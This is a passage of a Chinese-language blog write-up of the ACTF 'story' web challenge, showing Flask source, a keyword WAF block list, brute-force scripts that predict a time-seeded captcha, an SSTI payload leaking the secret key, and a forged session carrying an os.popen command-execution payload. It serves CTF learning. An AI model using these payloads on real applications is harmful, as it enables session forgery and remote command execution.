class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> story != <span class="string">""</span>:</span><br><span class="line">        tpl = <span class="built_in">open</span>(<span class="string">'templates/story.html'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">        <span class="keyword">return</span> render_template_string(tpl % story) </span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/"</span>)       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/write'</span>, methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line">    </span><br><span class="line">    story = request.json.get(<span class="string">'story'</span>, <span class="string">''</span>) </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'vip'</span>, <span class="string">''</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> minic_waf(story):</span><br><span class="line">            session[<span class="string">'username'</span>] = <span class="string">""</span></span><br><span class="line">            session[<span class="string">'vip'</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> jsonify({<span class="string">'status'</span>: <span class="string">'error'</span>, <span class="string">'message'</span>: <span class="string">'no way~~~'</span>})</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">'story'</span>] = story</span><br><span class="line">        <span class="keyword">return</span> jsonify({<span class="string">'status'</span>: <span class="string">'success'</span>, <span class="string">'message'</span>: <span class="string">'success'</span>})</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify({<span class="string">'status'</span>: <span class="string">'error'</span>, <span class="string">'message'</span>: <span class="string">'Please become a VIP first.'</span>}), <span class="number">400</span></span><br></pre></td></tr></tbody></table></figure>
<p>👴只放了三个路由，不是懒，而是没有必要，你用不着这么多了🤣</p>
<p>很明显，最终利用点就是 story 路由下的 render_template_string, 众所周知，这是 SSTI 的触发点.</p>
<p>但是参数是从 session 里面取出来的，你能伪造吗，那怎么说也得拿到 SECRET_KEY 啊，怎么拿到呢，通过 stroy 路由 ssti拿到，那我怎么 ssti, 先伪造 session, 那我怎么伪造 session, 先拿到 SECRET_KEY, 那我怎么拿到 SCECRET_KEY 呢，先 ssti…</p>
<p>坑爹呢！这是，😓(bushi)</p>
<p>好吧，正解其实是:</p>
<p>通过 write 路由写 session 的 story, 但是 write 路由利用有个条件，要伪造 vip, 那怎么伪造 vip, 那必然是先拿到 SECRET_KEY… 我说婷婷，打住，没完了是吧🤪.</p>
<p>vip 路由下能够让我们 session 中的 vip 为 true</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">'captcha'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">'vip'</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/story'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br></pre></td></tr></tbody></table></figure>
<p>不过条件是 generate_code 等于传入的 captcha, 而 generate_code 的生成逻辑是随机的四位，而且每访问一次都会变，直接爆破的人建议魔法披风.</p>
<p>我看看这个 captcha 的生成是怎么个事</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">4</span></span>):</span><br><span class="line">    characters = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br></pre></td></tr></tbody></table></figure>
<p>这玩个 p 啊，随机生成，我看看这个 class 怎么个事</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Captcha</span>:</span><br><span class="line">    lookup_table: t.<span class="type">List</span>[<span class="built_in">int</span>] = [<span class="built_in">int</span>(i * <span class="number">1.97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width: <span class="built_in">int</span> = <span class="number">160</span>, height: <span class="built_in">int</span> = <span class="number">60</span>, key: <span class="built_in">int</span> = <span class="literal">None</span>, length: <span class="built_in">int</span> = <span class="number">4</span>, </span></span><br><span class="line"><span class="params">                 fonts: t.<span class="type">Optional</span>[t.<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>, font_sizes: t.<span class="type">Optional</span>[t.<span class="type">Tuple</span>[<span class="built_in">int</span>]] = <span class="literal">None</span></span>):</span><br><span class="line">        self._width = width</span><br><span class="line">        self._height = height</span><br><span class="line">        self._length = length</span><br><span class="line">        self._key = (key <span class="keyword">or</span> <span class="built_in">int</span>(time.time())) + random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">        self._fonts = fonts <span class="keyword">or</span> DEFAULT_FONTS</span><br><span class="line">        self._font_sizes = font_sizes <span class="keyword">or</span> (<span class="number">42</span>, <span class="number">50</span>, <span class="number">56</span>)</span><br><span class="line">        self._truefonts: t.<span class="type">List</span>[FreeTypeFont] = []</span><br><span class="line">        random.seed(self._key)</span><br></pre></td></tr></tbody></table></figure>
<p>哦，原来是有种子的呀，那没事了 (nmsl).</p>
<p>这种子是当前时间戳的取证拼接 1 到 100 的随机数.</p>
<p>显然 time 我们可以自己本地生成，1 到 100 的随机数，凹概率你不会？爆破他个几百上千次，总能终出的.</p>
<p>终出不了也别干了，机器爆破这么多次，1 到 100 总得终出吧.🥵</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">'captcha'</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'image/png'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    }</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">'/vip'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br></pre></td></tr></tbody></table></figure>
<p>为此我们需要访问 captcha, 每次以当前时间戳 + 随机数为种子重置这个对象，所以要先访问 captch, 再访问 /vip.</p>
<p>流程是</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重置Captcha对象,以当前时间戳加<span class="number">1</span>至<span class="number">100</span>随机数-&gt;gen.generate()生成第一次随机数-&gt;/vip路由调用generate_code随机生成</span><br></pre></td></tr></tbody></table></figure>
<p>因此，我们也需要对轴</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">  gen.generate()</span><br><span class="line">  requests.get(url1 + <span class="string">"captcha"</span>, headers=headers)</span><br><span class="line">  </span><br></pre></td></tr></tbody></table></figure>
<p>首先完成这些操作，然后访问 captcha 路由，此时轴对上了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">captcha = generate_code()</span><br></pre></td></tr></tbody></table></figure>
<p>接下来生成一次 generate_code (), 并且访问 vip, 此时步调一致了，倘若种子一样，这样的请求不到 1 秒能完成，不会改变时间戳，那么本地生成的 code 和题目一样，就能够拿到 vip 了</p>
<p>今は👴の勝利だ</p>
<p>これが👴の最後のエクスポート！</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> utils.captcha <span class="keyword">import</span> Captcha,generate_code</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url1 =<span class="string">"http://127.0.0.1:15000/"</span></span><br><span class="line">url2 = <span class="string">"http://127.0.0.1:5001/"</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    headers={<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line"></span><br><span class="line">                          <span class="string">"Connection"</span>:<span class="string">"close"</span> ,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>:<span class="string">"en"</span>,</span><br><span class="line"><span class="string">"Accept"</span>:<span class="string">"*/*"</span></span><br><span class="line">             }</span><br><span class="line">    <span class="comment"># timekey = int(time.time())</span></span><br><span class="line"></span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">    gen.generate()</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    requests.get(url1 + <span class="string">"captcha"</span>, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rawBody = "{\"captcha\":\""+captcha+"\"}"</span></span><br><span class="line">    json = {<span class="string">"captcha"</span>: captcha}</span><br><span class="line">    <span class="comment"># print("json:" + f"{json}")</span></span><br><span class="line"></span><br><span class="line">    session = requests.session()</span><br><span class="line">    headers2 = {<span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"User-Agent"</span>:</span><br><span class="line">        <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line">                <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"en"</span>,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>}</span><br><span class="line">    cookies = {<span class="string">"session"</span>: <span class="string">"eyJjYXB0Y2hhIjoidHBUViJ9.ZUDlMw.Iwx2YVR3CqHYbpqySJWOEJX1hac"</span>}</span><br><span class="line">    res = session.post(url1 + <span class="string">"vip"</span>, json=json, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.headers[<span class="string">'Set-Cookie'</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>因为爆破，凹概率，循环跑就行</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101112607.png" alt="微信截图_20231101112607"></p>
<p>哈哈哈！👴は一番の天才だ</p>
<p>有 waf, 面白い！</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rule = [</span><br><span class="line">    [<span class="string">'\\x'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'.'</span>,<span class="string">'getitem'</span>,<span class="string">'print'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'cookies'</span>,<span class="string">'values'</span>,<span class="string">'getattribute'</span>,<span class="string">'config'</span>],                   <span class="comment"># rule 1</span></span><br><span class="line">    [<span class="string">'('</span>,<span class="string">']'</span>,<span class="string">'getitem'</span>,<span class="string">'_'</span>,<span class="string">'%'</span>,<span class="string">'print'</span>,<span class="string">'config'</span>,<span class="string">'args'</span>,<span class="string">'values'</span>,<span class="string">'|'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'dict'</span>,<span class="string">','</span>,<span class="string">'join'</span>,<span class="string">'.'</span>,<span class="string">'set'</span>],              <span class="comment"># rule 2</span></span><br><span class="line">    [<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'dict'</span>,<span class="string">','</span>,<span class="string">'config'</span>,<span class="string">'join'</span>,<span class="string">'\\x'</span>,<span class="string">')'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'attr'</span>,<span class="string">'__'</span>,<span class="string">'list'</span>,<span class="string">'globals'</span>,<span class="string">'.'</span>],                           <span class="comment"># rule 3</span></span><br><span class="line">    [<span class="string">'['</span>,<span class="string">')'</span>,<span class="string">'getitem'</span>,<span class="string">'request'</span>,<span class="string">'.'</span>,<span class="string">'|'</span>,<span class="string">'config'</span>,<span class="string">'popen'</span>,<span class="string">'dict'</span>,<span class="string">'doc'</span>,<span class="string">'\\x'</span>,<span class="string">'_'</span>,<span class="string">'\{\{'</span>,<span class="string">'mro'</span>],                          <span class="comment"># rule 4</span></span><br><span class="line">    [<span class="string">'\\x'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'config'</span>,<span class="string">'args'</span>,<span class="string">'cookies'</span>,<span class="string">'values'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'\{\{'</span>,<span class="string">'.'</span>,<span class="string">'request'</span>,<span class="string">'|'</span>,<span class="string">'attr'</span>],                          <span class="comment"># rule 5</span></span><br><span class="line">    [<span class="string">'print'</span>, <span class="string">'class'</span>, <span class="string">'import'</span>, <span class="string">'eval'</span>, <span class="string">'__'</span>, <span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'cookies'</span>,<span class="string">'values'</span>,<span class="string">'|'</span>,<span class="string">'\\x'</span>,<span class="string">'getitem'</span>]                  <span class="comment"># rule 6</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">minic_waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    waf_seq = random.sample(<span class="built_in">range</span>(<span class="number">21</span>),<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> singel_waf(<span class="built_in">input</span>, rule[waf_seq[index]]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></tbody></table></figure>
<p>规则比较独特，六个规则随机生成三个，其实只需满足一条就行，同样是凹概率.</p>
<p>这种 ssti 随便打，拿个密钥先.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 =<span class="string">"http://127.0.0.1:15000/"</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line"><span class="string">"story"</span></span><br><span class="line">:</span><br><span class="line"><span class="string">"{{config}}"</span></span><br><span class="line">}</span><br><span class="line">cookies = {<span class="string">"session"</span>:<span class="string">"eyJ2aXAiOnRydWV9.ZUHlMg.eUH9ICmOx6JUujFsb8MxYu4QkOE"</span>}</span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url=url1+<span class="string">"write"</span>,json=data,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        cookie = res.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">"="</span>)[<span class="number">1</span>].split(<span class="string">";"</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(cookie)</span><br><span class="line">        res2 = requests.get(url=url1+<span class="string">"story"</span>,cookies = {<span class="string">"session"</span>:cookie})</span><br><span class="line">        <span class="built_in">print</span>(res2.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure>
<p>这种爆破对👴来说还是太简单了，随随便便写个脚本冲了</p>
<p>拿到密钥能干很多事了，</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'6e409b39-94e4-4557-9549-961bafdebf98'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/story'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_get</span>():</span><br><span class="line">    session[<span class="string">'story'</span>] = <span class="string">"{{url_for.__globals__.__builtins__['__import__']('os').popen('cat flag').read()}}"</span></span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">'story'</span>] </span><br></pre></td></tr></tbody></table></figure>
<p>👴不想跑 flasksession 脚本，太懒了，费劲，😡,👴就直接在路由里面设置了.</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101135012.png" alt="微信截图_20231101135012"></p>
<p>eeeeeeeeez!</p>
<p>其它简单的题，👴不想动了.</p>
<p>终于🐛完了，好📕👚啊</p>
<p>これが君の知らない物語</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://1llustrious.github.io">1llustrious</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/">https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WP/">WP</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E5%A4%8D%E7%8E%B0/">复现</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/02/sctf/" title="sctf"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/20231130172050.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">sctf</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="关于DAS的小记"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202311301720531.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">关于DAS的小记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/04/JQCTF-Webshell-ng/" title="JQCTF-Webshell-ng"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202312011458070.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-04</div><div class="title">JQCTF-Webshell-ng</div></div></a></div><div><a href="/2023/12/02/sctf/" title="sctf"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/20231130172050.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-02</div><div class="title">sctf</div></div></a></div><div><a href="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/" title="PCTF小记"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-09</div><div class="title">PCTF小记</div></div></a></div><div><a href="/2023/11/30/DAS0RAYSXCBCTF/" title="DAS0RAYSXCBCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">DAS0RAYSXCBCTF</div></div></a></div><div><a href="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="关于DAS的小记"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202311301720531.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">关于DAS的小记</div></div></a></div><div><a href="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/" title="N1CTF_复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">N1CTF_复现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">1llustrious</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1llustrious"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text"> 写在前面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-latex"><span class="toc-number">2.</span> <span class="toc-text"> easy latex</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#new-url-%E7%89%B9%E6%80%A7"><span class="toc-number">2.1.</span> <span class="toc-text"> new URL 特性😂</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%94%A8%E5%88%B0%E9%A2%98%E7%9B%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 运用到题目🤪</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#visit-%E8%A7%A6%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text"> visit 触发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hooks"><span class="toc-number">3.</span> <span class="toc-text"> hooks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#what-is-webhook"><span class="toc-number">3.1.</span> <span class="toc-text"> what is webhook🤔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#abusing-jenkins-login"><span class="toc-number">3.2.</span> <span class="toc-text"> Abusing Jenkins login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%93"><span class="toc-number">3.3.</span> <span class="toc-text"> 开打😤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#~ave-mujicas-masquerade~"><span class="toc-number">4.</span> <span class="toc-text"> ~Ave Mujica’s Masquerade~</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%86%B2"><span class="toc-number">4.1.</span> <span class="toc-text"> 源码，冲😓</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#story"><span class="toc-number">5.</span> <span class="toc-text"> story</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text"> 源码🤔</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/" title="PCTF小记"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PCTF小记"></a><div class="content"><a class="title" href="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/" title="PCTF小记">PCTF小记</a><time datetime="2023-12-08T16:00:21.000Z" title="Created 2023-12-09 00:00:21">2023-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/04/JQCTF-Webshell-ng/" title="JQCTF-Webshell-ng"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312011458070.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JQCTF-Webshell-ng"></a><div class="content"><a class="title" href="/2023/12/04/JQCTF-Webshell-ng/" title="JQCTF-Webshell-ng">JQCTF-Webshell-ng</a><time datetime="2023-12-03T23:55:48.000Z" title="Created 2023-12-04 07:55:48">2023-12-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/" title="发电日记(一)">发电日记(一)</a><time datetime="2023-12-03T03:58:53.000Z" title="Created 2023-12-03 11:58:53">2023-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/sctf/" title="sctf"><img 